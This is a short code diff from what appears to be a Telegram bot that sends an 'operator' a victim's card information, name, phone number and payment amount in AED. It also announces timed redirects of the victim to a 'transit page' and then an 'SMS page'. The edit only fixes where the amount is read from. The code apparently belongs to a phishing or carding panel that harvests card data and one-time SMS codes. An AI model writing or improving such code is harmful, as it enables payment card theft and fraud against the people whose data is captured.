@@ -251,7 +251,7 @@ async def send_operator_data(callback: types.CallbackQuery, session_id: str, log
         f"{card_info_text}\n\n"
         f"👤  Имя: {customer.get('fullName')}\n"
         f"📞  Номер: {customer.get('phone')}\n\n"
-        f"💸  Сумма: {customer.get('total_amount')}.00 AED\n\n"
+        f"💸  Сумма: {card.get('total_amount')}.00 AED\n\n"
         f"🕒 <b>Таймеры запущены:</b>\n"
         f"• Через 15 сек: Вторая транзитная страница\n"
         f"• Через 30 сек: Страница SMS"
